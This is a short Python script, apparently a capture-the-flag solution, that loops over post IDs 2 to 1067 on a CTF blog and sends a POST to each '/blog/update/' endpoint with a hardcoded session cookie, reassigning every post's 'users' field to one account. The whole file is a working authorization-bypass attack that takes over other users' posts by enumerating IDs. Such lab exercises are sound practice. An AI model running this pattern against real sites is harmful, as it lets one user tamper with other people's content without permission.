import requests

URL = "https://bonitoblog.ctf.zone"
URI = "/blog/update/"

COOKIES = {
    "session":"eyJ1c2VybmFtZSI6InN3b2xsb3dzIn0.aJgbNw.S4AoaEkDXVY7HEhIiQNlNRy8G7Q"
}

for idx in range(2, 1068, 1):
    DATA = {
        "postId":str(idx),
        "users":"swollows"
    }
    
    resp = requests.post(URL + URI + str(idx), data=DATA, cookies=COOKIES)
    
    print(idx, resp.status_code)